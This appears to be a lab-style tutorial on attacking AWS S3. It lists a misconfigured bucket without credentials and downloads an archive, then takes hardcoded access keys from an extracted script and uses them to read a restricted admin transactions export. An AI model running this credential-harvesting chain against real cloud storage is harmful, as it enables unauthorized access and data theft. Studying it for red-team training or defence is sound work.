# AWS S3 Enumeration Basics Guide

This documentation provides a step-by-step guide for enumerating AWS S3 buckets, identifying misconfigurations, and accessing sensitive data using publicly available information. This guide is intended for educational purposes and ethical red team engagements.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Configure AWS CLI](#configure-aws-cli)
3. [Enumerate S3 Buckets](#enumerate-s3-buckets)
4. [Download Files from S3](#download-files-from-s3)
5. [Identify and Use Hardcoded Credentials](#identify-and-use-hardcoded-credentials)
6. [Troubleshooting](#troubleshooting)

---

## Prerequisites

- **AWS CLI** installed on your system.
- **Basic Linux command line knowledge**.
- Access to a target website and associated S3 bucket information.

---

## 1. Configure AWS CLI

Install the AWS CLI on Debian-based systems:

```bash
sudo apt install awscli
```

Verify the installation:

```bash
aws --version
```

If you have AWS credentials (Access Key ID and Secret Access Key), configure the AWS CLI:

```bash
aws configure
```

**Note**: Placeholder values for credentials:

- **AWS Access Key ID**: `AKIAxxxxxxxxxxxxxxxx`
- **AWS Secret Access Key**: `wJalrxxxxxxxxxxxxxxxxxxxxxxxxxx`
- **Default region name**: `us-east-1`

---

## 2. Enumerate S3 Buckets

### List S3 Bucket Contents (No Credentials)

If you know the bucket name, try listing its contents without credentials:

```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
```

#### Explanation

- `aws s3 ls`: List contents of an S3 bucket.
- `s3://dev.huge-logistics.com`: The target S3 bucket.
- `--no-sign-request`: Perform an unsigned request to check for public access.

### Recursive Listing

Attempt to list all directories recursively:

```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive
```

---

## 3. Download Files from S3

### Identify Accessible Directories

Check specific directories in the bucket:

```bash
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
```

### Download Files

Download files from an accessible directory:

```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
```

### Extract Files

Unzip the downloaded archive:

```bash
unzip hl_migration_project.zip
```

---

## 4. Identify and Use Hardcoded Credentials

After extracting the files, look for scripts containing hardcoded AWS credentials.

### Example of Hardcoded Credentials in a Script

```powershell
# AWS Configuration
$accessKey = "AKIAxxxxxxxxxxxxxxxx"
$secretKey = "MwGe3xxxxxxxxxxxxxxxxxxxxxxxxxxxx"
$region = "us-east-1"
```

### Configure AWS CLI with New Credentials

```bash
aws configure
```

When prompted, enter the new Access Key and Secret Key.

### Verify Identity

Check the execution context with:

```bash
aws sts get-caller-identity
```

---

## 5. Download Restricted Files with New Credentials

Now that you have valid credentials, try accessing restricted directories.

### Access `/admin` Directory

```bash
aws s3 ls s3://dev.huge-logistics.com/admin/
```

### Download Files

```bash
aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv .
```

---

## 6. Troubleshooting

### Access Denied Errors

- Ensure you have the correct permissions.
- Verify that the bucket is publicly accessible or that your credentials are valid.

### Invalid Credentials

- Double-check the Access Key and Secret Key.
- Ensure the region is set correctly (e.g., `us-east-1`).

### AWS CLI Installation Issues

Refer to the [AWS CLI Installation Guide](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html) for troubleshooting steps.

---
